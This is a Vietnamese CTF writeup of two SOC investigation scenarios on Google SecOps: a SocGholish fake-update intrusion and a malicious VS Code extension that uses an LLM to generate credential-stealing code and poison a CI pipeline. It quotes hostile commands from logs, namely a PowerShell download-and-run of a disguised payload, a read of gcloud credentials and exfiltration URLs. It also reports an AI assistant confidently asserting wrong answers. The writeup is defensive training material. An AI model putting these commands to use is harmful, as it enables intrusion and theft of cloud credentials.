---
title: "Operation Cymbal: Cold Room"
date: 2026-11-01
description: "Writeup trọn bộ ba scenario của Operation Cymbal: Cold Room — socGholish, lạm dụng LLM trong pipeline, và những cái bẫy khi truy vết trên Google SecOps."
tags: [writeup, soc, dfir, threat-hunting, ai-misuse]
permalink: /posts/operation-cymbal-cold-room.html
---

Sự kiện **Operation Cymbal: Cold Room** có ba scenario Investigation/Threat Hunting, tổng 18 flag. Đây là
writeup theo đúng thứ tự mình đã giải, gồm cả những chỗ bị kẹt và các đáp án nộp sai trước đó.

| # | Scenario | Thể loại | Điểm | Độ khó | Flag |
| --- | --- | --- | --- | --- | --- |
| 1 | Deceptive Click | Investigation | 675 | very easy | 6 |
| 2 | Rogue Synthesis | AI Misuse | 700 | medium | 6 |
| 3 | *(đang cập nhật)* | Threat Hunting | — | — | 6 |

Kết quả cuối: 3/3 scenario, 18/18 flag, hạng 2075 với đội một người.

> **Quy ước chung:** mọi mốc thời gian trong bài là UTC, khớp với `metadata.event_timestamp`. Cột Summary
> trên giao diện SecOps hiển thị theo múi giờ trình duyệt nên lệch +1 giờ — đừng dùng nó để dựng timeline.
>
> Flag nộp nguyên giá trị, không bọc `HTB{...}`.

## Scenario 1 — Deceptive Click

### Tổng quan

Nhân viên `marcus.vance` ở văn phòng Denver bấm vào một bản "cập nhật Chrome" giả trên một blog bị chèn mã độc (FAKEUPDATES / SocGholish). Từ máy này, attacker leo thang lên SYSTEM, Kerberoast hai service account, rồi đánh cắp dữ liệu từ DB server và file server.

Đề bài: scenario "Deceptive Click" (Investigation, very easy, 675 điểm) trong sự kiện Operation Cymbal: Cold Room. Công cụ: Google SecOps (SOAR Case, SIEM Search, Google Threat Intelligence).

| # | Câu hỏi | Đáp án | Nguồn log chính |
| --- | --- | --- | --- |
| 1 | Hostname máy Denver bị nhiễm | `CYM-DEN-W10-042.cymbal.corp` | SOAR Case |
| 2 | Blog bị compromise (referer) | `marketingtrends-insider.com` | Web proxy, `network.http.referral_url` |
| 3 | PID của svchost.exe bị hollow | `624` | Sysmon trên máy Denver |
| 4 | SPN bị Kerberoast | `MSSQLSvc/CYM-DB-01.cymbal.corp:1433` | Security 4769 trên CYM-DC-01 |
| 5 | Account dùng để lateral movement | `svc_dbadmin` | Security 4624 trên CYM-DB-01 |
| 6 | File zip staging trên file server | `Financial_Audit_2026.zip` | Sysmon 11 trên CYM-FS-01 |

#### Kill chain

```
[Blog bị hack · Flag 2]        [Máy Denver · Flag 1, 3]            [CYM-DC-01 · Flag 4]
marketingtrends-insider.com --> CYM-DEN-W10-042, marcus.vance  --> Kerberoasting (4769)
ChromeSetup_v124.zip            ChromeSetup.js -> d27e15eb.exe     MSSQLSvc/CYM-DB-01.cymbal.corp:1433
(FAKEUPDATES / SocGholish)      Hollow svchost PID 624                     |
                                net, nltest: trinh sát domain              | TGS ticket
                                                                           v
                                                               [Crack offline]
                                                               svc_dbadmin (SID ...1089)
                                                               svc_backup  (SID ...1088)
                                           svc_dbadmin                |            | svc_backup
                          +-------------------------------------------+            v
                          v                                              [CYM-FS-01 · Flag 6]
[CYM-DB-01 · Flag 5]                                                     svc_backup chạy powershell.exe
svc_dbadmin từ CYM-DATA-WS-007 qua WinRM                                 C:\Windows\Temp\Financial_Audit_2026.zip
sqlcmd backup -> cymbal_cust_q3.bak                                      Staging trước khi exfil (T1074)
zstd -> cymbal_q3_exfil.tar.zst
Exfil -> 142.11.200.188:8888
```

Log không cho thấy attacker đi từ máy Denver sang CYM-DATA-WS-007 bằng cách nào. Sơ đồ chỉ vẽ những bước có event làm bằng chứng.

Mẹo nộp flag: nhập đúng giá trị theo format, không bọc `HTB{...}`.

### Flag 1 — Hostname máy Denver

**Đáp án:** `CYM-DEN-W10-042.cymbal.corp`

**Cách làm**

1. Vào SOAR, mở hàng đợi Cases. Nếu trống thì mở rộng bộ lọc thời gian (case nằm ở ngày 15/10/2026).
2. Mở case "PowerShell Download And Execute" và đọc phần Entities / Alerts: hostname, IP nội bộ, user (`marcus.vance`).
3. Chuyển sang SIEM Search, kiểm tra lại bằng: `principal.hostname = "CYM-DEN-W10-042.cymbal.corp"`.

**Giải thích:** tên máy theo quy ước `CYM-<site>-<OS>-<số>`: `DEN` là Denver, `W10` là Windows 10. Đọc được quy ước đặt tên giúp phân biệt máy trạm (`W10`, `WS`), server (`DB`, `FS`) và DC (`DC`) ở các câu sau.

**Bài học:** luôn bắt đầu từ alert/case để lấy 3 pivot ban đầu: **host, user, thời điểm**. Mọi query sau đều xuất phát từ 3 giá trị này.

**Thực tế:** analyst L1 triage case, xác nhận asset và chủ sở hữu, rồi cô lập máy (network containment qua EDR) trước khi điều tra sâu, để attacker không tiếp tục lan sang máy khác.

### Flag 2 — Blog bị compromise (referer)

**Đáp án:** `marketingtrends-insider.com`

**Cách làm**

1. Đọc GTI Malware Profile của FAKEUPDATES: nạn nhân vào một trang hợp pháp bị chèn JavaScript, trang hiện thông báo "trình duyệt cần cập nhật" và cho tải một file zip chứa `.js`.
2. Lọc log proxy/HTTP của máy Denver quanh thời điểm tải: `principal.hostname = "CYM-DEN-W10-042.cymbal.corp" AND network.http.method = "GET"`, hoặc tìm thẳng tên file `ChromeSetup`.
3. Mở event tải `ChromeSetup_v124.zip`, xem trường `network.http.referral_url` = `https://marketingtrends-insider.com/`. Lấy phần domain.

**Giải thích:** `target.url` cho biết file được tải từ **đâu**. Referer cho biết người dùng **đang ở trang nào** khi bấm tải. Với SocGholish, trang đó là blog hợp pháp bị hack, còn file được phục vụ từ hạ tầng riêng của attacker. Đề hỏi đúng cái blog.

**Bài học:** đọc threat intel trước khi search. Profile đã nói rõ chuỗi lây nhiễm (blog bị hack → fake update → file `.js`), nên bạn biết cần tìm trường nào.

**Thực tế:** chặn domain/URL trên proxy, search toàn công ty xem còn ai truy cập blog đó. Biện pháp phòng ngừa phổ biến: đổi chương trình mặc định mở `.js`/`.jse` từ Windows Script Host sang Notepad bằng GPO, vì hầu như không người dùng nào cần chạy file JScript.

### Flag 3 — PID của svchost.exe bị process hollowing

**Đáp án:** `624` (svchost.exe `-k netsvcs -p`, chạy dưới quyền SYSTEM)

**Chuỗi process trên máy Denver**

1. `explorer.exe` → `wscript.exe` chạy `ChromeSetup.js` (nạn nhân double-click file trong zip).
2. `wscript.exe` → `powershell.exe -w Hidden -c "iwr ... https://static.cdn-updater-distribution.net/assets/d27e15eb.png -OutFile C:\Users\marcus.vance\AppData\Local\Temp\d27e15eb.exe; Start-Process ..."`. Payload ngụy trang thành `.png` rồi đổi thành `.exe` khi lưu.
3. `d27e15eb.exe` hollow vào svchost.exe **PID 624** để có quyền SYSTEM.
4. Sau đó là trinh sát domain: `net.exe group "Domain Admins" /domain`, `nltest.exe`.

**Cách làm đúng:** tìm event mà **source** là `d27e15eb.exe` và **target** là `svchost.exe`. Sysmon Event 8 (CreateRemoteThread) hoặc Event 10 (ProcessAccess) ghi sẵn cặp `SourceImage` / `TargetImage` và `TargetProcessId`. Query gợi ý:

```
principal.hostname = "CYM-DEN-W10-042.cymbal.corp" AND target.process.file.full_path = /svchost\.exe/ nocase AND principal.process.file.full_path = /d27e15eb/ nocase
```

Nếu UDM không ra, dùng Raw Log Search với từ khóa `d27e15eb`.

**Vì sao 4192, 6124, 8120 sai:** đó là PID của các process **khác** trong chuỗi: 4192 là process cha của wscript, 6124 là PowerShell tải payload, 8120 là `net.exe`. Đề hỏi **Target** Process ID của svchost, tức phía bị tiêm, không phải phía tiêm hay process con.

**Bài học:** với injection, luôn phân biệt rõ source (kẻ tiêm), target (nạn nhân) và parent/child. Đừng lấy số PID đầu tiên nhìn thấy.

**Thực tế:** process hollowing (MITRE T1055.012) khiến mã độc chạy dưới danh nghĩa một process tin cậy. EDR phát hiện bằng cách so image trên đĩa với image trong bộ nhớ, hoặc cảnh báo khi một file trong `AppData\Local\Temp` mở handle ghi vào process SYSTEM. Máy bị hollow coi như mất kiểm soát hoàn toàn và cần reimage.

### Flag 4 — SPN bị Kerberoast

**Đáp án:** `MSSQLSvc/CYM-DB-01.cymbal.corp:1433`

**Cách làm**

1. Kerberoasting tạo ra Security Event **4769** (A Kerberos service ticket was requested) trên Domain Controller.
2. Query: `metadata.product_event_type = "4769" AND target.hostname = /CYM-DC-01/ nocase`. Nếu bị lỗi enum hay không ra kết quả, hãy bỏ bớt điều kiện và chỉ giữ `metadata.product_event_type = "4769"`.
3. Mở event, đọc trường `target.application` (ServiceName / SPN). Giá trị đầy đủ gồm cả port `:1433`.

**Giải thích:** bất kỳ user domain nào cũng được xin ticket TGS cho một SPN. Ticket đó được mã hóa bằng hash mật khẩu của service account sở hữu SPN. Attacker lấy ticket về và crack offline (hashcat mode 13100). `MSSQLSvc/...:1433` là SPN của SQL Server trên CYM-DB-01, chạy bằng `svc_dbadmin`.

**Lỗi thường gặp:** gõ `metadata.event_type = "..."` với giá trị không nằm trong enum sẽ báo `invalid value for enum field`. Mã Windows event phải dùng `metadata.product_event_type`. Ngoài ra, không được bỏ `:1433` khi nộp flag.

**Bài học:** học thuộc vài event ID xác thực quan trọng: 4624 (logon), 4625 (logon fail), 4768 (TGT), 4769 (TGS), 4672 (đăng nhập có quyền admin).

**Thực tế:** dấu hiệu Kerberoast là 4769 với `TicketEncryptionType = 0x17` (RC4), hoặc một user xin nhiều SPN trong thời gian ngắn. Phòng ngừa: dùng gMSA (mật khẩu 120 ký tự, tự xoay vòng), tắt RC4, đặt mật khẩu service account dài trên 25 ký tự, và cài honey SPN để bắt attacker.

### Flag 5 — Account dùng để lateral movement

**Đáp án:** `svc_dbadmin`

**Cách làm**

1. Tìm logon mạng (4624) của các service account sau thời điểm Kerberoast: `metadata.product_event_type = "4624" AND target.user.userid = /^svc_/`.
2. Kết quả: `svc_dbadmin` đăng nhập vào **CYM-DB-01** từ **CYM-DATA-WS-007** (10.240.12.65), LogonType 3, NTLM, lúc 20:47:11 UTC.
3. 15 giây sau, Sysmon trên CYM-DB-01 ghi `wsmprovhost.exe` chạy dưới `svc_dbadmin`. Đây là phiên PowerShell Remoting (WinRM, T1021.006).

**Attacker làm gì trên CYM-DB-01** (đều chạy dưới svc_dbadmin, phần lớn xuất phát từ `wsmprovhost.exe`, PID 3820):

| Giờ UTC | Hành động |
| --- | --- |
| 21:49:46 | `powershell.exe` kết nối ra `142.11.200.188:8888`: exfiltration |
| 21:19:56 | Tạo `C:\ProgramData\README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT`: thư tống tiền |
| 21:13:26 | `zstd.exe` nén file backup thành `cymbal_q3_exfil.tar.zst` |
| 20:49:56 | `sqlcmd` backup database `CymbalWealthMaster` ra `cymbal_cust_q3.bak` |
| 20:47:26 | `wsmprovhost.exe` khởi động (WinRM) |
| 20:47:11 | Logon 4624 của `svc_dbadmin` từ CYM-DATA-WS-007 |

**Giải thích:** SPN ở Flag 4 thuộc SQL Server, nên account bị crack là account chạy SQL, tức `svc_dbadmin`. Một service account đăng nhập tương tác qua WinRM từ một máy trạm là bất thường: service account chỉ nên chạy dịch vụ, không dùng để đăng nhập.

**Bài học:** nối các event bằng **LogonId / LogonGuid** (`0x6E1F4`) và **ParentProcessId** (3820) để chứng minh mọi hành động thuộc cùng một phiên của attacker.

**Thực tế:** reset mật khẩu service account ngay (hoặc chuyển sang gMSA), giới hạn quyền logon ("Deny log on through Remote Desktop / network" cho service account), và chỉ cho WinRM nhận kết nối từ jump host quản trị.

### Flag 6 — File zip staging trên file server

**Đáp án:** `Financial_Audit_2026.zip`

**Event quyết định:** Sysmon Event 11 (FileCreate), RuleName `T1074 Data Staged`

| Trường | Giá trị |
| --- | --- |
| Computer | `CYM-FS-01.cymbal.corp` |
| User | `CYMBAL\svc_backup` (SID ...-1088) |
| Image | `powershell.exe` (PID 4920) |
| TargetFilename | `C:\Windows\Temp\Financial_Audit_2026.zip` |
| Thời điểm | 2026-10-15 21:25:56 UTC |

**Cách làm**

1. Bỏ bộ lọc theo user và tìm theo **hành vi**: `target.file.full_path = /\.zip$/ nocase`.
2. Hoặc tìm theo lệnh nén: `target.process.command_line = /Compress-Archive|\.zip/ nocase`.
3. Hoặc dùng Raw Log Search với từ khóa `.zip` / `Audit`.

**Vì sao bị kẹt lâu ở câu này**

- Query ban đầu lọc `svc_dbadmin`, nhưng trên file server attacker dùng **`svc_backup`**. SID chỉ lệch nhau 1 số (1088 và 1089), rất có thể cả hai đều bị Kerberoast.
- Gemini gọi `CYM-DATA-WS-007` là file server. Thực ra `WS` là workstation, là máy attacker dùng làm bàn đạp. File server là `CYM-FS-01`.
- Các đáp án đã nộp sai (`cymbal_q3_exfil.tar.zst`, `cymbal_cust_q3.bak`) đều nằm trên DB server và không phải file zip. Chỉ cần so với đề (file server + `.zip`) là loại được ngay.

**Bài học:** khi hunt, lọc theo hành vi trước (loại file, lệnh, technique), rồi mới lần ngược ra user và host. Lọc theo account quá sớm sẽ bỏ sót khi attacker đổi danh tính.

**Thực tế:** staging (T1074) thường diễn ra ngay trước exfiltration, nên phát hiện ở bước này vẫn kịp chặn dữ liệu ra ngoài. Rule gợi ý: file archive lớn được tạo trong `C:\Windows\Temp` hoặc `C:\ProgramData` bởi service account. Sau đó kiểm tra kết nối ra ngoài từ CYM-FS-01 (giống `142.11.200.188:8888` trên DB-01) để biết file zip đã bị đưa ra hay chưa.

### Bài học tổng hợp

**Sai lầm đã gặp và cách tránh**

1. **Tin AI đoán mò.** Gemini khẳng định "chính xác 100%" với PID 8120 và với các tên file của DB-01, nhưng đều sai. Mỗi đáp án phải chỉ ra được **một event cụ thể** và **một trường cụ thể** chứa nó.
2. **Không đối chiếu với đề.** Đề nói "file server" và "zip", nhưng đã nộp file `.tar.zst` và `.bak` trên DB server. Trước khi nộp, kiểm tra đáp án khớp với mọi từ khóa trong câu hỏi: host, loại file, format.
3. **Nhầm vai trò của PID.** Source, target, parent và child là bốn khái niệm khác nhau. Đọc kỹ đề hỏi cái nào.
4. **Lọc theo user quá sớm.** Attacker có thể có nhiều account. Hãy hunt theo hành vi trước.
5. **Đoán tên trường UDM.** Các lỗi `field "text" does not exist`, `invalid value for enum` xảy ra do đoán tên trường. Mở một event mẫu trong Event Viewer để xem tên trường thật, hoặc dùng Raw Log Search.

**Quy trình chung cho bài Investigation trên SecOps**

1. Case/alert → lấy host, user, thời điểm.
2. Đọc threat intel (GTI profile) → biết chuỗi tấn công dự kiến.
3. Đi theo kill chain: initial access → execution → privilege escalation → discovery → credential access → lateral movement → collection → exfiltration.
4. Mở rộng khung thời gian và đổi pivot (host ↔ user ↔ IP ↔ hash) khi bị kẹt.
5. Nối event bằng LogonId, ProcessGuid, ParentProcessId.

**Cheat sheet UDM query**

| Mục đích | Query |
| --- | --- |
| Tất cả event của một host | `principal.hostname = "CYM-DEN-W10-042.cymbal.corp"` |
| Process launch trên host | `principal.hostname = "..." AND metadata.event_type = "PROCESS_LAUNCH"` |
| Theo mã Windows event | `metadata.product_event_type = "4769"` |
| Logon của service account | `metadata.product_event_type = "4624" AND target.user.userid = /^svc_/` |
| File theo đuôi | `target.file.full_path = /\.zip$/ nocase` |
| Command line chứa từ khóa | `target.process.command_line = /Compress-Archive/ nocase` |
| Referer HTTP | `network.http.referral_url != ""` |
| Theo user (hai phía) | `principal.user.userid = "svc_dbadmin" OR target.user.userid = "svc_dbadmin"` |

Dùng regex `/.../ nocase` khi không chắc chữ hoa/thường hay tên đầy đủ. Không ra kết quả gì thì chuyển sang Raw Log Search.

## Scenario 2 — Rogue Synthesis

### Tổng quan

Developer `alex.chen` cài một extension VS Code giả mạo (`SyntaxOptimizer`) từ một domain nhái Visual Studio Marketplace. Extension này gọi Gemini API để **sinh mã C ngay lúc chạy**, biên dịch thành exe, rồi exe đó hollow vào `svchost.exe` để đọc token gcloud. Token bị gửi ra ngoài qua một endpoint giả dạng telemetry. Attacker dùng service account `svc_cicd_deploy` để WinRM sang CI runner và ghi đè script build production, tức là đầu độc pipeline CI/CD.

Đề bài: scenario "Rogue Synthesis" (AI Misuse, medium, 700 điểm) trong sự kiện Operation Cymbal: Cold Room. Công cụ: Google SecOps SIEM Search và Google Threat Intelligence (GTI).

| # | Câu hỏi | Đáp án | Nguồn log chính |
| --- | --- | --- | --- |
| 1 | Developer gửi request tới model của AI threat | `alex.chen` | Zscaler web proxy, request tới `generativelanguage.googleapis.com` |
| 2 | Package được tải ngay trước API query | `SyntaxOptimizer-2.1.4.vsix` | Zscaler, `target.url` từ `marketplace.visualstudio.com.cdn-cache.net` |
| 3 | Executable được drop vào thư mục staging | `sys_worker.exe` | Sysmon 1, command line của `gcc.exe` |
| 4 | File token trong thư mục Cloud SDK bị đọc | `credentials.db` | Sysmon 1, `cmd.exe` con của svchost bị hollow |
| 5 | Domain nhận dữ liệu exfil | `dev-metrics-cdn.com` | Zscaler, `https://dev-metrics-cdn.com/api/v2/telemetry` |
| 6 | Script PowerShell bị ghi đè để persistence | `build_production.ps1` | Sysmon 11 trên `CYM-CI-RUNNER-01` |

> **Lưu ý về thời gian:** cột Summary trên giao diện SecOps hiển thị theo múi giờ trình duyệt (UTC+1). Trường `metadata.event_timestamp` là UTC. Ví dụ: Summary ghi `21:24:26`, còn `event_timestamp` là `20:24:26Z`. Writeup này dùng **UTC**.

#### Kill chain

```
[Workstation CYM-DEV-WS-019 · alex.chen]

 20:18:11  Tải SyntaxOptimizer-2.1.4.vsix         <-- marketplace.visualstudio.com.cdn-cache.net (domain nhái)  · Flag 2
 20:19:56  Code.exe -> node.exe optimizer-daemon.js (extension độc chạy)
 20:23:41  node.exe -> generativelanguage.googleapis.com (Gemini API)                             · Flag 1
 20:24:06  Tạo %TEMP%\thinking_robot_log.txt
 20:24:26  Tạo %TEMP%\cache_worker.c   (mã C do LLM sinh)
 20:25:11  node.exe -> gcc.exe -O2 cache_worker.c -o %TEMP%\sys_worker.exe                        · Flag 3
           sys_worker.exe hollow vào svchost.exe -k netsvcs -p (PID 624, SYSTEM)
 20:46:06  svchost(624) -> cmd.exe /c "type C:\Users\alex.chen\.gcloud\credentials.db"            · Flag 4
 20:53:36  POST https://dev-metrics-cdn.com/api/v2/telemetry  (sent 4200 bytes)                   · Flag 5
                 |
                 |  credential của svc_cicd_deploy
                 v
[CI runner CYM-CI-RUNNER-01]
 21:55:56  svchost.exe -> wsmprovhost.exe  (PowerShell Remoting / WinRM, svc_cicd_deploy)
 22:02:56  powershell.exe ghi C:\BuildRunner\scripts\build_production.ps1                         · Flag 6
           Sysmon RuleName: T1505.003 "Build Hook Injection"
```

Log không trực tiếp cho thấy `credentials.db` chứa `svc_cicd_deploy`. Mối liên hệ được suy ra từ thứ tự thời gian và việc service account này xuất hiện ngay sau đó trên CI runner.

Mẹo nộp flag: nhập đúng giá trị theo format, giữ nguyên chữ hoa và chữ thường như trong log.

### Bước 0 — Đọc threat intel trước

Tên scenario và mô tả ("AI threat", "model used by our AI threat") gợi đến nhóm malware mà GTIG mô tả là **gọi LLM lúc runtime** để tự sinh hoặc tự biến đổi mã, ví dụ PROMPTFLUX (gọi Gemini API, staging trong `%TEMP%`, có file log "thinking robot"). Từ đó suy ra pivot đầu tiên: tìm request tới domain API của LLM (`generativelanguage.googleapis.com`, `huggingface.co`, ...).

**Bài học:** threat intel cho bạn biết **tìm gì** (domain API, thư mục staging, tên file đặc trưng) trước khi gõ query đầu tiên.

### Flag 1 — Developer gửi request tới model

**Đáp án:** `alex.chen`

**Cách làm**

1. Tìm mọi request tới API của LLM:
   ```
   target.hostname = /generativelanguage\.googleapis\.com/ nocase
   OR target.hostname = /huggingface\.co/ nocase
   OR target.url = /gemini|qwen|v1beta\/models|chat\/completions/ nocase
   ```
2. Ở panel Aggregations, mở `principal.user.userid`. Có ba developer: `sarah.jenkins`, `marcus.vance`, `alex.chen`. Chỉ `alex.chen` có request tới `generativelanguage.googleapis.com` khớp với chuỗi hành vi độc (các bước sau đều xảy ra trên máy của alex.chen).

**Giải thích:** event này đến từ **Zscaler web proxy**, nên không có hostname hay process (cột hiện `—`). Proxy biết user (qua xác thực) nhưng không biết process nào gửi request. Muốn biết máy nào thì phải pivot sang Sysmon theo user.

**Bài học:** log proxy cho **user + đích đến**, log EDR/Sysmon cho **host + process**. Ghép hai nguồn bằng user và thời điểm.

### Flag 2 — Package tải ngay trước API query

**Đáp án:** `SyntaxOptimizer-2.1.4.vsix`

**Cách làm**

1. Lấy toàn bộ timeline của user:
   ```
   principal.user.userid = "alex.chen" OR target.user.userid = "alex.chen"
   ```
   Kết quả có 25 event từ 3 nguồn: `WINDOWS_SYSMON` (13), `ZSCALER_WEBPROXY` (11), `OKTA` (1). Từ đây biết máy là **`CYM-DEV-WS-019.cymbal.corp`**.
2. Sắp theo thời gian, nhìn các request ngay trước 20:23:41 (Gemini API):
   - 20:10:26: `marketplace.visualstudio.com` (marketplace thật)
   - **20:18:11: `marketplace.visualstudio.com.cdn-cache.net`** (domain nhái)
   - 20:19:56: `Code.exe` khởi chạy `node.exe`
3. Mở event 20:18:11, đọc `target.url`: tên file ở cuối URL là `SyntaxOptimizer-2.1.4.vsix`.

**Giải thích:** `marketplace.visualstudio.com.cdn-cache.net` có tên miền thật là `cdn-cache.net`. Chuỗi `marketplace.visualstudio.com` chỉ là subdomain để đánh lừa mắt người đọc. File `.vsix` là gói extension VS Code. Sysmon xác nhận extension đã được cài tại `C:\Users\alex.chen\.vscode\extensions\devtools.syntaxoptimizer-2.1.4\`.

**Lỗi đã gặp:** query đầu tiên dùng `principal.hostname = "alex.chen"` (nhầm username thành hostname) và đặt `nocase` sau `re.regex(...)` (sai cú pháp), nên không ra kết quả. Cú pháp đúng là `field = /regex/ nocase`.

**Thực tế:** extension VS Code chạy với toàn quyền của user và không có sandbox. Biện pháp: allowlist extension qua policy (`extensions.allowed`), chặn cài `.vsix` thủ công, và chặn trên proxy các domain chứa tên marketplace mà không phải domain chính thức.

### Flag 3 — Executable drop vào thư mục staging

**Đáp án:** `sys_worker.exe`

**Cách làm**

1. Trong timeline của alex.chen, các event của `node.exe` (PID 6720, chạy `optimizer-daemon.js`) sau lúc gọi API:
   - 20:24:06: tạo `thinking_robot_log.txt`
   - 20:24:26: tạo `C:\Users\alex.chen\AppData\Local\Temp\cache_worker.c` (Sysmon gắn rule `T1074 Data Staged`)
   - 20:25:11: khởi chạy `gcc.exe`
   
   Vậy thư mục staging là `C:\Users\alex.chen\AppData\Local\Temp\`.
2. Lấy command line của gcc:
   ```
   principal.hostname = "CYM-DEV-WS-019.cymbal.corp" AND metadata.event_type = "PROCESS_LAUNCH"
   AND target.process.file.full_path = /gcc\.exe/ nocase
   ```
3. Có hai kết quả. Chọn event có process cha là `node.exe`:
   ```
   gcc.exe -O2 C:\Users\alex.chen\AppData\Local\Temp\cache_worker.c -o C:\Users\alex.chen\AppData\Local\Temp\sys_worker.exe
   ```

**Phân biệt với hoạt động bình thường:** lúc 20:13:06 cũng có `gcc.exe`, nhưng do `Code.exe` chạy và biên dịch `Projects\api-gateway\main.c` ra `gateway.exe`. Đó là công việc thật của developer. Điểm khác biệt: process cha (`Code.exe` hay `node.exe` của extension), thư mục nguồn (`Projects` hay `Temp`), và thời điểm (trước hay sau lúc gọi Gemini).

**Lỗi đã gặp:** lọc tiếp trên kết quả cũ (chỉ có FILE_CREATION) nên không thấy event gcc vốn là PROCESS_LAUNCH. Khi đổi câu hỏi, hãy xóa filter và chạy query mới.

**Thực tế:** đây là điểm then chốt của AI misuse: mã độc **không mang payload theo**, mà xin LLM viết mã rồi tự biên dịch tại chỗ. Mỗi lần chạy có thể ra một binary khác nhau, nên hash-based detection vô dụng. Cách phát hiện theo hành vi: compiler (`gcc`, `cl`, `csc`) được khởi chạy bởi `node.exe`/`python.exe` với file nguồn và output trong `%TEMP%`.

### Flag 4 — File token trong thư mục Cloud SDK

**Đáp án:** `credentials.db`

**Event quyết định:** Sysmon Event 1 (Process Create)

| Trường | Giá trị |
| --- | --- |
| Thời điểm | 2026-10-15 20:46:06 UTC |
| ParentImage | `C:\Windows\System32\svchost.exe` |
| ParentCommandLine | `C:\Windows\system32\svchost.exe -k netsvcs -p` |
| ParentProcessId | `624` |
| ParentUser | `NT AUTHORITY\SYSTEM` |
| Image | `C:\Windows\System32\cmd.exe` (PID 7890) |
| CommandLine | `cmd.exe /c "type C:\Users\alex.chen\.gcloud\credentials.db"` |
| RuleName | `T1003.008 ... Cloud Tokens` |

**Cách làm**

1. Timeline của alex.chen có event lạ: `cmd.exe launched by svchost.exe`. `svchost.exe` gần như không bao giờ khởi chạy `cmd.exe` trong tình huống bình thường.
2. Mở event, đọc `Event.EventData.Data[5]` (CommandLine) trong extracted fields.

**Vì sao các query trước không ra:**
- `target.file.full_path = /gcloud/` không khớp vì attacker không mở file trực tiếp, mà chạy `type` trong cmd. Đường dẫn chỉ nằm trong **command line**, không có event đọc file nào.
- Thư mục là `C:\Users\alex.chen\.gcloud\`, không phải `%APPDATA%\gcloud\` như vị trí mặc định của Cloud SDK trên Windows. Regex `/gcloud/` vẫn khớp cả hai.

**Giải thích:** `svchost.exe -k netsvcs -p` chạy dưới SYSTEM nhưng process con lại chạy dưới `CYMBAL\alex.chen`, và cùng LogonId với phiên của user. Đây là dấu hiệu một process svchost đã bị thay ruột (process hollowing, T1055.012) bởi `sys_worker.exe`.

**Bài học:** khi không thấy event đọc file, tìm đường dẫn trong `target.process.command_line`. Attacker hay dùng lệnh có sẵn (`type`, `copy`, `certutil`) thay vì mở file bằng code riêng.

**Thực tế:** file `credentials.db` (SQLite) của gcloud chứa refresh token và key của service account. Lấy được file này là có quyền vào GCP như chính user đó, không cần mật khẩu hay MFA. Biện pháp: dùng Workload Identity hoặc token ngắn hạn thay cho service account key, bật cảnh báo khi process không phải `gcloud`/`python` đọc thư mục cấu hình gcloud, và thu hồi token ngay khi máy bị nghi nhiễm (`gcloud auth revoke`, xoay key của service account).

### Flag 5 — Domain nhận dữ liệu exfil

**Đáp án:** `dev-metrics-cdn.com`

**Cách làm**

1. Trong timeline, event mạng ngay sau lúc đọc `credentials.db` (20:46:06) là 20:53:36 tới `dev-metrics-cdn.com`.
2. Mở event (nguồn `ZSCALER_WEBPROXY`):

| Trường | Giá trị |
| --- | --- |
| `target.url` | `https://dev-metrics-cdn.com/api/v2/telemetry` |
| `network.application_protocol` | `HTTPS` |
| `network.sent_bytes` | 4200 |
| `network.received_bytes` | 14200 |
| `principal.application` | General Browsing |
| `additional.fields["urlclass"]` | Business Use |

**Giải thích:** path `/api/v2/telemetry` và tên `dev-metrics-cdn` được chọn để trông như telemetry của công cụ dev. Zscaler còn phân loại là "Business Use", nên rule chặn theo category sẽ bỏ qua.

**Bài học:** đừng tin tên domain hay URL category. Hãy xem **thời điểm** (ngay sau khi đọc credential), **chiều dữ liệu** (POST, sent_bytes đáng kể) và **tuổi của domain** (tra GTI xem domain mới đăng ký hay có quan hệ với hạ tầng độc hại).

**Thực tế:** chặn domain trên proxy, search toàn công ty xem còn máy nào gửi tới `dev-metrics-cdn.com` hay `cdn-cache.net`. Coi mọi credential trên máy là đã bị lộ.

### Flag 6 — Script PowerShell bị ghi đè để persistence

**Đáp án:** `build_production.ps1`

**Cách làm**

1. Tìm host và service account mới xuất hiện sau thời điểm exfil:
   ```
   metadata.event_type = "USER_LOGIN" OR metadata.event_type = "PROCESS_LAUNCH"
   ```
   Kết quả trộn nhiều scenario khác (`linminer-01`, `devon.reed`, `svc_backup` trên `CYM-FS-01`...). Host đáng chú ý nhất là **`CYM-CI-RUNNER-01.cymbal.corp`**, vì đề nói mục tiêu cuối là pipeline CI/CD.
2. Lọc theo CI runner:
   ```
   principal.hostname = /CYM-CI-RUNNER-01/ nocase
   ```
3. Ba event:

| Giờ UTC | Event | User |
| --- | --- | --- |
| 21:23:11 | `cmd.exe` được `svchost.exe` khởi chạy | `sarah.jenkins` (không thuộc chuỗi này) |
| **21:55:56** | `wsmprovhost.exe` được `svchost.exe` khởi chạy | **`svc_cicd_deploy`** |
| **22:02:56** | `powershell.exe` ghi `C:\BuildRunner\scripts\build_production.ps1` | **`svc_cicd_deploy`** |

4. Event 22:02:56 là Sysmon Event 11 (FileCreate), RuleName `T1505.003 Build Hook Injection`, Image `powershell.exe` (PID 3410).

**Giải thích:** `wsmprovhost.exe` là process host của phiên PowerShell Remoting (WinRM, T1021.006). Attacker dùng `svc_cicd_deploy` để vào CI runner, rồi ghi đè script build production. Từ đó, mỗi lần pipeline chạy, mã của attacker sẽ chạy với quyền của pipeline và có thể chèn vào artifact phát hành.

Sysmon ghi Event 11 cả khi tạo file mới lẫn khi ghi đè file đã có. Đề nói "existing file ... overwritten", còn tên rule cũng xác nhận đây là chèn hook vào build.

**Bài học:** để tìm persistence trên CI/CD, tìm thao tác ghi vào file `.ps1`, `.sh`, `.yml` trong thư mục build bởi một account không phải hệ thống CI (hoặc qua một kênh bất thường như WinRM).

**Thực tế:** đây là tấn công chuỗi cung ứng (supply chain). Cần so sánh `build_production.ps1` với bản trong git để biết đoạn mã bị chèn, kiểm tra mọi artifact build sau 22:02:56 UTC và thu hồi nếu cần. Phòng ngừa: script build chỉ lấy từ repo có review (không để sửa trực tiếp trên runner), dùng runner ephemeral, giới hạn WinRM chỉ từ jump host, xoay credential của `svc_cicd_deploy`.

### Bài học tổng hợp

**Sai lầm đã gặp và cách tránh**

1. **Nhầm username với hostname.** `alex.chen` là user, máy là `CYM-DEV-WS-019`. Đọc kỹ cột nào trong bảng Aggregations là gì.
2. **Sai cú pháp regex.** Dùng `field = /regex/ nocase`, không viết `re.regex(field, ...) nocase`.
3. **Lọc trên kết quả cũ.** Mỗi câu hỏi mới chạy một query mới. Filter cũ có thể loại bỏ đúng event cần tìm.
